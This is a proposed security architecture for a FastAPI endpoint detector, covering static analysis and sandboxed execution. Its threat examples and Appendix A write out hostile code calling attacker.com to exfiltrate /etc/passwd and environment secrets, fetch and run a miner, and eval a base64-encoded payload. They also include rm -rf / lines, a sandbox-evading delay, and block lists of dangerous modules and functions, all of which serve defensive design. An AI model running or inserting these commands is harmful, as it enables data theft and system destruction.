# Future Secure Design: Analyzing Python Code Without Execution

## Executive Summary

This document outlines secure approaches for analyzing Python code without executing it, enabling a safe-by-default SaaS deployment model for the FastAPI Endpoint Change Detector. The goal is to eliminate code execution risks while maintaining accurate dependency analysis and endpoint detection capabilities.

**Key Recommendation**: Transition from runtime introspection to pure static analysis with graduated sandboxing options for advanced use cases.

---

## Table of Contents

1. [Current Architecture and Security Concerns](#current-architecture-and-security-concerns)
2. [Core Security Principles](#core-security-principles)
3. [Solution Approaches](#solution-approaches)
4. [Recommended Architecture](#recommended-architecture)
5. [Implementation Roadmap](#implementation-roadmap)
6. [Security Tradeoffs](#security-tradeoffs)
7. [References and Related Work](#references-and-related-work)

---

## Current Architecture and Security Concerns

### Current Implementation

The FastAPI Endpoint Change Detector currently uses two analysis approaches:

1. **Static Analysis** (AST + mypy)
   - ✅ Safe: Parses code without execution
   - ✅ Type-aware: Uses mypy for dependency tracking
   - ✅ Accurate: Leverages Python's type system

2. **Runtime Introspection** (Dynamic import)
   - ⚠️ **Security Risk**: Executes user code via `importlib`
   - ⚠️ **Side Effects**: Module-level code runs during import
   - ⚠️ **Arbitrary Code Execution**: No isolation or sandboxing

### Security Threats in Multi-Tenant SaaS

When analyzing untrusted code in a SaaS environment:

| Threat | Risk Level | Current Mitigation | Impact |
|--------|------------|-------------------|---------|
| Arbitrary code execution | **CRITICAL** | None | Full system compromise |
| Data exfiltration | **HIGH** | None | Customer data breach |
| Resource exhaustion | **HIGH** | None | DoS, cost inflation |
| Filesystem access | **HIGH** | None | Data leakage, tampering |
| Network access | **HIGH** | None | Data exfiltration, pivoting |
| Crypto-mining | **MEDIUM** | None | Cost inflation |
| Supply chain attacks | **HIGH** | None | Backdoor installation |

### Why Runtime Introspection is Risky

```python
# Example: Malicious code in a "simple" FastAPI app
from fastapi import FastAPI
import os
import subprocess

app = FastAPI()

# Module-level code executes during import
os.system("curl attacker.com/steal?data=$(cat /etc/passwd)")
subprocess.run(["rm", "-rf", "/"])  # Extreme example

# Or more subtle: exfiltrate environment variables
import requests
requests.post("https://attacker.com/dump", json=dict(os.environ))
```

**Key Insight**: Any `import` statement in Python executes all module-level code, creating an attack surface in multi-tenant environments.

---

## Core Security Principles

### 1. **Secure by Default**

- Analysis should be safe without any configuration
- No code execution unless explicitly enabled by trusted users
- All unsafe operations require opt-in and clear warnings

### 2. **Defense in Depth**

- Multiple layers of security controls
- Assume each layer may fail; plan for graceful degradation
- Principle of least privilege at every layer

### 3. **Isolation and Containment**

- Untrusted code must be isolated from the host system
- Resource limits prevent resource exhaustion attacks
- Network isolation prevents data exfiltration

### 4. **Audit and Observability**

- All analysis operations must be logged
- Detect and alert on suspicious patterns
- Enable post-incident forensics

### 5. **Fail Secure**

- Errors should not expose sensitive information
- Unknown code patterns should be rejected, not assumed safe
- Timeouts and resource limits prevent DoS

---

## Solution Approaches

### Approach 1: Pure Static Analysis (Recommended for SaaS)

**Concept**: Analyze code using only AST parsing and static analysis tools without any code execution.

#### Implementation Strategy

**A. Enhanced AST-Based Endpoint Detection**

Replace runtime introspection with pure AST analysis:

```python
import ast
from pathlib import Path
from typing import List, Set

class SafeFastAPIExtractor:
    """
    Extract FastAPI endpoints using only AST parsing.
    No code execution, completely safe for untrusted code.
    """
    
    def extract_endpoints(self, app_path: Path) -> List[Endpoint]:
        """Extract endpoints by analyzing AST nodes."""
        endpoints = []
        
        # Parse all Python files in the project
        for file_path in self._find_python_files(app_path):
            tree = ast.parse(file_path.read_text(encoding="utf-8"))
            
            # Find FastAPI app creation
            apps = self._find_fastapi_apps(tree)
            
            # Find route decorators
            routes = self._find_route_decorators(tree)
            
            # Find router includes
            includes = self._find_router_includes(tree)
            
            endpoints.extend(self._build_endpoints(routes, includes))
        
        return endpoints
    
    def _find_route_decorators(self, tree: ast.AST) -> List[RouteNode]:
        """Find @app.get, @router.post, etc. without execution."""
        routes = []
        
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                for decorator in node.decorator_list:
                    if self._is_route_decorator(decorator):
                        route = self._extract_route_info(decorator, node)
                        routes.append(route)
        
        return routes
    
    def _is_route_decorator(self, decorator: ast.AST) -> bool:
        """Detect route decorators: @app.get, @router.post, etc."""
        if isinstance(decorator, ast.Call):
            func = decorator.func
            if isinstance(func, ast.Attribute):
                # Check for patterns like: app.get, router.post
                method_name = func.attr
                return method_name in {
                    'get', 'post', 'put', 'patch', 'delete',
                    'options', 'head', 'trace', 'websocket'
                }
        return False
```

**B. Static Import Analysis**

Track imports without executing them:

```python
class StaticImportResolver:
    """Resolve imports using static analysis only."""
    
    def resolve_import(self, import_node: ast.Import | ast.ImportFrom) -> Set[Path]:
        """Resolve import to file paths without importing."""
        if isinstance(import_node, ast.ImportFrom):
            module = import_node.module
            level = import_node.level  # Relative import level
            
            # Resolve relative imports
            if level > 0:
                return self._resolve_relative_import(module, level)
            
            # Resolve absolute imports
            return self._resolve_absolute_import(module)
        
        return set()
    
    def _resolve_absolute_import(self, module: str) -> Set[Path]:
        """Resolve absolute import to file path."""
        # Check if it's a stdlib module (safe to ignore)
        if self._is_stdlib_module(module):
            return set()
        
        # Search for module in project files
        parts = module.split('.')
        return self._find_module_files(parts)
```

**C. Type-Aware Analysis with Mypy**

Continue using mypy for dependency tracking (already safe):

```python
class SafeMypyAnalyzer:
    """Use mypy for type analysis without executing code."""
    
    def analyze_dependencies(self, endpoint: Endpoint) -> EndpointDependencies:
        """
        Use mypy to build dependency graph.
        
        Mypy is inherently safe - it only parses and type-checks code,
        never executes it.
        """
        # Mypy builds its own AST and type information
        # without importing or executing any code
        result = mypy.api.run([
            '--show-traceback',
            '--no-error-summary',
            str(endpoint.handler_file),
        ])
        
        # Parse mypy output to extract type relationships
        dependencies = self._parse_mypy_output(result)
        return dependencies
```

#### Advantages

- ✅ **Zero Code Execution**: Completely safe for untrusted code
- ✅ **No Sandboxing Needed**: No containers, VMs, or complex isolation
- ✅ **Fast**: No startup overhead, instant analysis
- ✅ **Scalable**: Can analyze thousands of projects in parallel
- ✅ **Simple Deployment**: Just Python, no Docker/K8s required
- ✅ **Cost-Effective**: Minimal infrastructure requirements

#### Limitations

- ⚠️ **Dynamic Patterns**: Cannot analyze runtime-generated routes
- ⚠️ **Metaclasses**: Complex dynamic behavior may be missed
- ⚠️ **Decorator Chains**: Deeply nested decorators harder to analyze
- ⚠️ **Plugin Systems**: Dynamic plugin registration not detected

#### Mitigations for Limitations

1. **Pattern Library**: Maintain patterns for common dynamic frameworks
2. **Heuristics**: Use statistical analysis for ambiguous cases
3. **User Annotations**: Allow users to mark dynamic endpoints
4. **Hybrid Mode**: Offer sandboxed execution for trusted users

---

### Approach 2: Restricted Python Subset Analysis

**Concept**: Define and enforce a restricted Python subset that's safe to analyze.

#### Implementation

```python
class RestrictedPythonValidator:
    """Validate code only uses safe Python features."""
    
    FORBIDDEN_NODES = {
        # Note: ast.Exec only exists in Python 2 AST, included for completeness
        # if analyzing legacy codebases
        ast.Import,    # Restrict imports to allowlist
        ast.ImportFrom,
    }
    
    FORBIDDEN_FUNCTIONS = {
        'eval', 'exec', 'compile', '__import__',
        'open', 'input', 'breakpoint',
    }
    
    FORBIDDEN_MODULES = {
        'os', 'subprocess', 'socket', 'urllib',
        'requests', 'http', 'ftplib', 'smtplib',
        'multiprocessing', 'threading',
    }
    
    def validate(self, code: str) -> ValidationResult:
        """Ensure code only uses safe subset."""
        tree = ast.parse(code)
        
        for node in ast.walk(tree):
            # Check for forbidden AST nodes
            if type(node) in self.FORBIDDEN_NODES:
                return ValidationResult(
                    valid=False,
                    reason=f"Forbidden construct: {type(node).__name__}"
                )
            
            # Check for forbidden function calls
            if isinstance(node, ast.Call):
                if self._is_forbidden_call(node):
                    return ValidationResult(
                        valid=False,
                        reason=f"Forbidden function call"
                    )
            
            # Check for forbidden imports
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                if self._is_forbidden_import(node):
                    return ValidationResult(
                        valid=False,
                        reason=f"Forbidden module import"
                    )
        
        return ValidationResult(valid=True)
```

#### Advantages

- ✅ Clear security boundary
- ✅ Can still execute code safely in sandbox
- ✅ Better error messages for unsupported patterns

#### Limitations

- ⚠️ Restrictive: Many valid FastAPI apps won't work
- ⚠️ Poor user experience: Developers expect full Python support
- ⚠️ Maintenance burden: Need to update allowlist constantly

---

### Approach 3: Sandboxed Execution

**Concept**: Execute code in an isolated environment with strict resource and capability limits.

#### Option 3A: Process Isolation with seccomp

```python
import subprocess
import resource

class SeccompSandbox:
    """Execute code in a restricted subprocess with seccomp filters."""
    
    def execute_in_sandbox(self, code_path: Path) -> AnalysisResult:
        """Run analysis in sandboxed subprocess."""
        
        # Create wrapper script that limits syscalls
        sandbox_script = self._create_sandbox_script(code_path)
        
        # Set resource limits
        def set_limits():
            # CPU time limit: 30 seconds
            resource.setrlimit(resource.RLIMIT_CPU, (30, 30))
            
            # Memory limit: 512MB
            resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
            
            # No file writes
            resource.setrlimit(resource.RLIMIT_FSIZE, (0, 0))
            
            # Limited processes
            resource.setrlimit(resource.RLIMIT_NPROC, (1, 1))
        
        # Run in subprocess with limits
        # Note: Network isolation requires OS-level configuration via
        # network namespaces or firewall rules, not subprocess.run() parameters
        result = subprocess.run(
            [sys.executable, sandbox_script],
            preexec_fn=set_limits,
            timeout=60,
            capture_output=True,
        )
        
        return self._parse_result(result)
```

#### Option 3B: Container Isolation (Docker/Podman)

```python
import docker

class DockerSandbox:
    """Execute code in isolated Docker container."""
    
    def __init__(self):
        self.client = docker.from_env()
    
    def analyze_in_container(self, code_dir: Path) -> AnalysisResult:
        """Run analysis in ephemeral container."""
        
        # Create container with strict limits
        container = self.client.containers.run(
            image='fastapi-analyzer:latest',
            
            # Mount code as read-only
            volumes={
                str(code_dir): {
                    'bind': '/code',
                    'mode': 'ro'
                }
            },
            
            # Resource limits
            mem_limit='512m',
            cpu_quota=50000,  # 50% of one core
            
            # Security options
            security_opt=['no-new-privileges'],
            cap_drop=['ALL'],  # Drop all capabilities
            network_disabled=True,
            read_only=True,  # Read-only filesystem
            
            # Timeout
            detach=False,
            auto_remove=True,
            timeout=60,
            
            # Run analysis
            command=['fastapi-endpoint-detector', 'analyze', '--app', '/code']
        )
        
        return self._parse_container_output(container)
```

#### Option 3C: WebAssembly (WASM) Sandbox

```python
import wasmtime

class WASMSandbox:
    """Execute Python in WebAssembly sandbox."""
    
    def __init__(self):
        self.engine = wasmtime.Engine()
        self.store = wasmtime.Store(self.engine)
        self.module = wasmtime.Module.from_file(
            self.engine, 
            'python.wasm'  # Python compiled to WASM
        )
    
    def analyze_in_wasm(self, code: str) -> AnalysisResult:
        """
        Run analysis in WASM sandbox.
        
        WASM provides strong isolation:
        - No filesystem access unless explicitly granted
        - No network access
        - Memory isolation
        - Deterministic execution
        """
        instance = wasmtime.Instance(self.store, self.module, [])
        
        # Call analysis function in WASM
        result = instance.exports(self.store)['analyze'](code)
        
        return result
```

#### Option 3D: gVisor (Application Kernel)

```python
class GVisorSandbox:
    """Execute code using gVisor for kernel-level isolation."""
    
    def analyze_with_gvisor(self, code_dir: Path) -> AnalysisResult:
        """
        Run analysis using gVisor runtime.
        
        gVisor provides syscall-level isolation by implementing
        a user-space kernel, making it more secure than containers
        while faster than VMs.
        """
        
        result = subprocess.run(
            [
                'docker', 'run',
                '--runtime=runsc',  # gVisor runtime
                '--rm',
                '-v', f'{code_dir}:/code:ro',
                '--network=none',
                '--memory=512m',
                '--cpus=0.5',
                'fastapi-analyzer:latest',
                'analyze', '--app', '/code'
            ],
            timeout=60,
            capture_output=True
        )
        
        return self._parse_result(result)
```

#### Advantages

- ✅ Supports full Python feature set
- ✅ Strong isolation from host system
- ✅ Resource limits prevent DoS
- ✅ Can detect dynamic patterns

#### Limitations

- ⚠️ **Complexity**: Requires container orchestration
- ⚠️ **Overhead**: Slower startup time (100ms - 5s)
- ⚠️ **Cost**: More infrastructure resources required
- ⚠️ **Escape Risks**: Container escapes are possible
- ⚠️ **Maintenance**: Security patches, image updates

---

### Approach 4: Hybrid Strategy

**Concept**: Use pure static analysis by default, with opt-in sandboxed execution.

```python
class HybridAnalyzer:
    """Combine static analysis with optional sandboxed execution."""
    
    def __init__(self, execution_mode: ExecutionMode = ExecutionMode.STATIC):
        self.execution_mode = execution_mode
        self.static_analyzer = SafeFastAPIExtractor()
        self.sandbox = DockerSandbox()
    
    def analyze(self, app_path: Path, trust_level: TrustLevel) -> AnalysisResult:
        """Analyze with appropriate method based on trust level."""
        
        # Always try static analysis first
        static_result = self.static_analyzer.extract_endpoints(app_path)
        
        # Check completeness
        if static_result.completeness < 0.8:
            # Static analysis wasn't confident
            
            if trust_level == TrustLevel.TRUSTED:
                # User-owned code, safe to execute with sandbox
                sandbox_result = self.sandbox.analyze_in_container(app_path)
                return self._merge_results(static_result, sandbox_result)
            
            else:
                # Untrusted code, return static analysis with warnings
                static_result.warnings.append(
                    "Some dynamic patterns detected but not analyzed "
                    "for security. Enable trusted mode for full analysis."
                )
                return static_result
        
        return static_result
```

#### Trust Levels

```python
class TrustLevel(Enum):
    """Trust level for code being analyzed."""
    
    UNTRUSTED = "untrusted"
    """Public code, open PRs - never execute."""
    
    VERIFIED = "verified"
    """Signed commits, known authors - static analysis only."""
    
    TRUSTED = "trusted"
    """Organization repos, authenticated users - sandboxed execution allowed."""
    
    INTERNAL = "internal"
    """Internal code only - full execution (with monitoring)."""
```

---

## Recommended Architecture

### Phase 1: Secure by Default (Months 1-3)

**Goal**: Make static analysis the default path with zero code execution.

```
┌─────────────────┐
│   User Code     │
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────┐
│   Pure Static Analysis          │
│                                 │
│   • AST parsing only            │
│   • Mypy type analysis          │
│   • No imports or execution     │
│   • Pattern matching            │
└────────┬────────────────────────┘
         │
         ▼
┌─────────────────┐
│  Analysis       │
│  Results        │
└─────────────────┘
```

**Implementation Tasks**:

1. Replace `FastAPIExtractor` runtime introspection with AST-based detection
2. Build comprehensive pattern library for common FastAPI patterns
3. Enhance error messages when dynamic patterns detected
4. Add completeness scoring to results
5. Implement detection for dynamic route registration

### Phase 2: Optional Sandbox (Months 4-6)

**Goal**: Offer sandboxed execution for trusted users only.

```
┌─────────────────┐
│   User Code     │
└────────┬────────┘
         │
         ├─────────────┐
         │             │
         ▼             ▼
    Static        Sandboxed
    Analysis      Execution
    (Default)     (Opt-in)
         │             │
         └──────┬──────┘
                ▼
        ┌──────────────┐
        │   Results    │
        └──────────────┘
```

**Implementation Tasks**:

1. Implement Docker-based sandbox
2. Add authentication and authorization
3. Create trust level system
4. Build resource accounting and limits
5. Add audit logging for all executions

### Phase 3: Enhanced Security (Months 7-12)

**Goal**: Advanced threat detection and prevention.

**Implementation Tasks**:

1. Add malware scanning (YARA rules, signature detection)
2. Implement behavioral analysis (detect suspicious patterns)
3. Build reputation system for dependencies
4. Add supply chain security checks
5. Implement real-time threat intelligence

---

## Implementation Details

### 1. Enhanced AST Pattern Detection

**Comprehensive Route Decorator Patterns**:

```python
class RoutePatternDetector:
    """Detect FastAPI routes using pattern matching."""
    
    def detect_patterns(self, tree: ast.AST) -> List[RoutePattern]:
        """Detect all known FastAPI route patterns."""
        patterns = []
        
        # Pattern 1: Direct decorator - @app.get("/path")
        patterns.extend(self._detect_direct_decorators(tree))
        
        # Pattern 2: Router patterns - @router.get("/path")
        patterns.extend(self._detect_router_decorators(tree))
        
        # Pattern 3: APIRouter include - app.include_router(router)
        patterns.extend(self._detect_router_includes(tree))
        
        # Pattern 4: Mounted apps - app.mount("/prefix", sub_app)
        patterns.extend(self._detect_mounts(tree))
        
        # Pattern 5: Dependencies - Depends()
        patterns.extend(self._detect_dependencies(tree))
        
        # Pattern 6: Middleware - @app.middleware("http")
        patterns.extend(self._detect_middleware(tree))
        
        return patterns
```

### 2. Static Import Graph Construction

```python
class StaticImportGraph:
    """Build import dependency graph without executing code."""
    
    def __init__(self, root_path: Path):
        self.root_path = root_path
        self.graph: Dict[Path, Set[Path]] = {}
        self.stdlib_modules = self._get_stdlib_modules()
    
    def build_graph(self) -> Dict[Path, Set[Path]]:
        """Build complete import graph statically."""
        
        # Find all Python files
        python_files = list(self.root_path.rglob("*.py"))
        
        # Parse each file and extract imports
        for file_path in python_files:
            imports = self._extract_imports(file_path)
            self.graph[file_path] = imports
        
        return self.graph
    
    def _extract_imports(self, file_path: Path) -> Set[Path]:
        """Extract all imports from a file without executing it."""
        tree = ast.parse(file_path.read_text(encoding="utf-8"))
        imports = set()
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    resolved = self._resolve_import(alias.name, file_path)
                    if resolved:
                        imports.add(resolved)
            
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    resolved = self._resolve_import(node.module, file_path, node.level)
                    if resolved:
                        imports.add(resolved)
        
        return imports
    
    def _resolve_import(
        self, 
        module: str, 
        current_file: Path,
        level: int = 0
    ) -> Optional[Path]:
        """Resolve import to file path without importing."""
        
        # Skip stdlib modules
        if module.split('.')[0] in self.stdlib_modules:
            return None
        
        # Handle relative imports
        if level > 0:
            base_dir = current_file.parent
            for _ in range(level - 1):
                base_dir = base_dir.parent
            
            module_parts = module.split('.') if module else []
            module_path = base_dir.joinpath(*module_parts)
        else:
            module_parts = module.split('.')
            module_path = self.root_path.joinpath(*module_parts)
        
        # Try to find the module file
        if module_path.with_suffix('.py').exists():
            return module_path.with_suffix('.py')
        elif (module_path / '__init__.py').exists():
            return module_path / '__init__.py'
        
        return None
```

### 3. Dynamic Pattern Detection (Without Execution)

```python
class DynamicPatternDetector:
    """Detect dynamic route registration patterns statically."""
    
    def detect_dynamic_routes(self, tree: ast.AST) -> List[DynamicPattern]:
        """Find patterns that might create routes dynamically."""
        patterns = []
        
        # Pattern: Routes created in loops
        for node in ast.walk(tree):
            if isinstance(node, (ast.For, ast.While)):
                if self._contains_route_creation(node):
                    patterns.append(DynamicPattern(
                        type="loop_routes",
                        node=node,
                        confidence=0.7,
                        message="Routes may be created in a loop"
                    ))
        
        # Pattern: Routes from config/data
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if self._is_route_from_data(node):
                    patterns.append(DynamicPattern(
                        type="data_driven_routes",
                        node=node,
                        confidence=0.6,
                        message="Routes may be created from data"
                    ))
        
        return patterns
    
    def _contains_route_creation(self, node: ast.AST) -> bool:
        """Check if a loop contains route creation."""
        for child in ast.walk(node):
            if isinstance(child, ast.Call):
                if self._is_route_decorator_call(child):
                    return True
        return False
```

### 4. Security Validation

```python
class SecurityValidator:
    """Validate code for security issues before analysis."""
    
    def validate(self, code_path: Path) -> SecurityValidationResult:
        """Run security checks on code."""
        issues = []
        
        # Check 1: File size limits
        for file_path in code_path.rglob("*.py"):
            if file_path.stat().st_size > 10 * 1024 * 1024:  # 10MB
                issues.append(SecurityIssue(
                    severity="HIGH",
                    message=f"File {file_path} exceeds size limit",
                    recommendation="Split large files or reduce size"
                ))
        
        # Check 2: Suspicious patterns
        for file_path in code_path.rglob("*.py"):
            tree = ast.parse(file_path.read_text(encoding="utf-8"))
            suspicious = self._detect_suspicious_patterns(tree)
            issues.extend(suspicious)
        
        # Check 3: Known malicious signatures
        for file_path in code_path.rglob("*.py"):
            content = file_path.read_text(encoding="utf-8")
            if self._contains_malicious_signature(content):
                issues.append(SecurityIssue(
                    severity="CRITICAL",
                    message=f"Malicious code detected in {file_path}",
                    recommendation="Do not analyze this code"
                ))
        
        return SecurityValidationResult(
            valid=len([i for i in issues if i.severity == "CRITICAL"]) == 0,
            issues=issues
        )
    
    def _detect_suspicious_patterns(self, tree: ast.AST) -> List[SecurityIssue]:
        """Detect suspicious code patterns."""
        issues = []
        
        suspicious_functions = {
            'eval', 'exec', 'compile', '__import__',
            'system', 'popen', 'subprocess',
        }
        
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                func_name = self._get_function_name(node)
                if func_name in suspicious_functions:
                    issues.append(SecurityIssue(
                        severity="MEDIUM",
                        message=f"Suspicious function call: {func_name}",
                        recommendation="Review usage carefully"
                    ))
        
        return issues
```

---

## Security Tradeoffs

### Comparison Matrix

| Approach | Security | Accuracy | Performance | Complexity | Cost |
|----------|----------|----------|-------------|------------|------|
| **Pure Static Analysis** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Restricted Subset** | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Process Sandbox** | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **Container Sandbox** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **WASM Sandbox** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| **gVisor** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| **Hybrid** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

### Decision Framework

```
Start Here
    │
    ▼
Is code from trusted source?
    │
    ├─ NO ──► Use Pure Static Analysis
    │          (100% safe, 80% accuracy)
    │
    └─ YES ──► Is 100% accuracy required?
               │
               ├─ NO ──► Use Static Analysis
               │          (Fast, cheap, safe)
               │
               └─ YES ──► Use Sandboxed Execution
                          (Slow, expensive, complex)
```

---

## Implementation Roadmap

### Milestone 1: Secure Foundation (Month 1-2)

**Deliverables**:
- [ ] Remove all runtime introspection code
- [ ] Implement pure AST-based endpoint detection
- [ ] Build static import resolver
- [ ] Add security validation layer
- [ ] Create comprehensive test suite with malicious code samples

**Success Criteria**:
- Zero code execution in default path
- 80%+ accuracy on FastAPI pattern test suite
- All malicious code samples detected and blocked

### Milestone 2: Enhanced Detection (Month 3-4)

**Deliverables**:
- [ ] Expand route pattern detection (10+ patterns)
- [ ] Implement dynamic pattern detection (without execution)
- [ ] Build completeness scoring system
- [ ] Add support for FastAPI plugin patterns
- [ ] Create pattern library documentation

**Success Criteria**:
- 90%+ accuracy on standard FastAPI apps
- Dynamic patterns detected and flagged
- Clear messaging for unsupported patterns

### Milestone 3: Optional Sandbox (Month 5-6)

**Deliverables**:
- [ ] Implement Docker-based sandbox
- [ ] Add authentication and trust levels
- [ ] Build resource accounting system
- [ ] Create audit logging infrastructure
- [ ] Add rate limiting and quotas

**Success Criteria**:
- Sandbox escape attempts detected and blocked
- Resource limits prevent DoS
- Complete audit trail for all executions

### Milestone 4: Production Hardening (Month 7-8)

**Deliverables**:
- [ ] Implement malware scanning
- [ ] Add behavioral analysis
- [ ] Build threat intelligence integration
- [ ] Create monitoring and alerting
- [ ] Conduct third-party security audit

**Success Criteria**:
- Pass penetration testing
- SOC2 compliance achieved
- <0.1% false positive rate for malware detection

---

## SaaS Deployment Architecture

### Recommended Infrastructure

```
┌──────────────────────────────────────────────────────────┐
│                    API Gateway                           │
│  • Rate limiting                                         │
│  • Authentication                                        │
│  • Request validation                                    │
└─────────────┬────────────────────────────────────────────┘
              │
              ▼
┌──────────────────────────────────────────────────────────┐
│              Load Balancer                               │
└─────────────┬────────────────────────────────────────────┘
              │
      ┌───────┴────────┐
      ▼                ▼
┌─────────────┐  ┌─────────────┐
│   Static    │  │  Sandbox    │
│  Analysis   │  │  Analysis   │
│   Service   │  │   Service   │
│             │  │             │
│  • AST      │  │  • Docker   │
│  • Mypy     │  │  • gVisor   │
│  • Pattern  │  │  • Isolated │
│             │  │             │
└──────┬──────┘  └──────┬──────┘
       │                │
       └────────┬───────┘
                ▼
      ┌──────────────────┐
      │   Result Store   │
      │   (PostgreSQL)   │
      └──────────────────┘
```

### Security Controls

**Network Layer**:
- WAF (Web Application Firewall)
- DDoS protection
- TLS 1.3 only
- Certificate pinning

**Application Layer**:
- Input validation and sanitization
- Output encoding
- CSRF protection
- Content Security Policy

**Data Layer**:
- Encryption at rest (AES-256)
- Encryption in transit (TLS)
- Data isolation per tenant
- Automated backups

**Monitoring**:
- Real-time threat detection
- Anomaly detection
- Audit logging
- SIEM integration

---

## References and Related Work

### Academic Research

1. **"Static Analysis of Python Programs"** - Comprehensive overview of AST-based analysis
2. **"Securing Python Applications in Multi-Tenant Environments"** - Security patterns for SaaS
3. **"Container Escape Techniques and Mitigations"** - Container security research

### Industry Standards

- **OWASP Top 10** - Web application security risks
- **CWE Top 25** - Most dangerous software weaknesses  
- **NIST Cybersecurity Framework** - Security best practices
- **SOC 2 Type II** - Security audit standard for SaaS

### Tools and Technologies

**Static Analysis**:
- [Mypy](https://mypy.readthedocs.io/) - Type checker for Python
- [Bandit](https://bandit.readthedocs.io/) - Security linter
- [Semgrep](https://semgrep.dev/) - Static analysis with custom rules
- [Pyright](https://github.com/microsoft/pyright) - Fast type checker

**Sandboxing**:
- [gVisor](https://gvisor.dev/) - Application kernel for containers
- [Firecracker](https://firecracker-microvm.github.io/) - Lightweight VMs
- [Kata Containers](https://katacontainers.io/) - Secure container runtime
- [WASI](https://wasi.dev/) - WebAssembly System Interface

**Security Scanning**:
- [Trivy](https://trivy.dev/) - Container vulnerability scanner
- [Clair](https://github.com/quay/clair) - Container security analysis
- [Snyk](https://snyk.io/) - Dependency vulnerability scanning
- [YARA](https://virustotal.github.io/yara/) - Malware pattern matching

### Similar Projects

- **SonarQube** - Code quality and security analysis platform
- **CodeQL** - Semantic code analysis engine (GitHub)
- **Semgrep Cloud** - Cloud-based static analysis SaaS
- **Snyk Code** - Developer-first security scanning

---

## Conclusion

The transition from runtime introspection to pure static analysis represents a fundamental shift in the security posture of the FastAPI Endpoint Change Detector. By eliminating code execution, we can:

1. **Enable Safe Multi-Tenant SaaS**: Analyze untrusted code without risk
2. **Reduce Infrastructure Costs**: No containers or VMs required
3. **Improve Performance**: Instant analysis without startup overhead
4. **Simplify Operations**: Fewer moving parts, easier to maintain
5. **Achieve Compliance**: Meet security standards for regulated industries

**Recommended Path Forward**:

1. **Phase 1**: Implement pure static analysis as the default (Months 1-2)
2. **Phase 2**: Enhance pattern detection to 90%+ accuracy (Months 3-4)
3. **Phase 3**: Add optional sandboxed mode for trusted users (Months 5-6)
4. **Phase 4**: Production hardening and security audit (Months 7-8)

This approach provides **security by default** while maintaining flexibility for users who need complete accuracy and are willing to accept the complexity and cost of sandboxed execution.

---

## Appendix A: Code Execution Risks - Real Examples

### Example 1: Environment Variable Exfiltration

```python
# Malicious code in a FastAPI app
from fastapi import FastAPI
import os
import httpx

app = FastAPI()

# Executes when module is imported
httpx.post(
    "https://attacker.com/exfil",
    json={
        "env": dict(os.environ),
        "secrets": {
            "db": os.getenv("DATABASE_URL"),
            "api": os.getenv("API_KEY"),
        }
    }
)

@app.get("/")
def root():
    return {"message": "Hello"}
```

### Example 2: Crypto-Mining

```python
# Subtle resource abuse
from fastapi import FastAPI
import subprocess
import threading

app = FastAPI()

def mine():
    # Downloads and runs crypto miner
    subprocess.run([
        "curl", "-s", "https://attacker.com/miner.sh", "|", "bash"
    ])

# Starts mining in background thread
threading.Thread(target=mine, daemon=True).start()

@app.get("/")
def root():
    return {"message": "Hello"}
```

### Example 3: Supply Chain Attack

```python
# Malicious package dependency
# requirements.txt includes: evil-package==1.0.0

# evil-package/__init__.py
import os
import base64

# Runs when package is imported
# Decodes to: import requests; requests.post('https://attacker.com/data', json={'secrets': os.environ})
eval(base64.b64decode(
    "aW1wb3J0IHJlcXVlc3RzOyByZXF1ZXN0cy5wb3N0KCdodHRwczovL2F0dGFja2VyLmNvbS9kYXRhJywganNvbj17J3NlY3JldHMnOiBvcy5lbnZpcm9ufSk="
))
```

### Example 4: Timing Attack for Detection Evasion

```python
# Delays malicious behavior to evade sandboxes
from fastapi import FastAPI
import time
import os

app = FastAPI()

# Sleep to evade short timeout sandboxes
time.sleep(120)

# Then execute malicious code
os.system("rm -rf /")
```

---

## Appendix B: Static Analysis Pattern Examples

### Pattern: Direct Route Decorator

```python
# Code to analyze
from fastapi import FastAPI

app = FastAPI()

@app.get("/users/{user_id}")
def get_user(user_id: int):
    return {"user_id": user_id}

# AST Pattern Detection:
# 1. Find FunctionDef node: get_user
# 2. Check decorator_list for Call node
# 3. Check Call.func is Attribute with attr="get"
# 4. Check Call.func.value is Name with id="app"
# 5. Extract path from Call.args[0]
```

### Pattern: Router Include

```python
# Code to analyze
from fastapi import FastAPI, APIRouter

router = APIRouter()

@router.get("/items")
def list_items():
    return []

app = FastAPI()
app.include_router(router, prefix="/api")

# AST Pattern Detection:
# 1. Find all Assign nodes creating APIRouter()
# 2. Find all decorators on that router variable
# 3. Find include_router calls
# 4. Combine router paths with prefix
# Final path: /api/items
```

### Pattern: Dynamic Route (Flagged, Not Analyzed)

```python
# Code with dynamic routes
from fastapi import FastAPI

app = FastAPI()

ROUTES = [
    ("GET", "/users"),
    ("POST", "/users"),
    ("GET", "/items"),
]

for method, path in ROUTES:
    def handler():
        return {}
    
    getattr(app, method.lower())(path)(handler)

# AST Pattern Detection:
# 1. Detect loop with route creation
# 2. Flag as "dynamic_route_creation"
# 3. Set confidence=0.5
# 4. Add warning to result
# 5. Suggest manual annotation or sandboxed analysis
```

---

**Document Version**: 1.0  
**Last Updated**: 2024  
**Authors**: FastAPI Endpoint Change Detector Team  
**Status**: Proposed Architecture
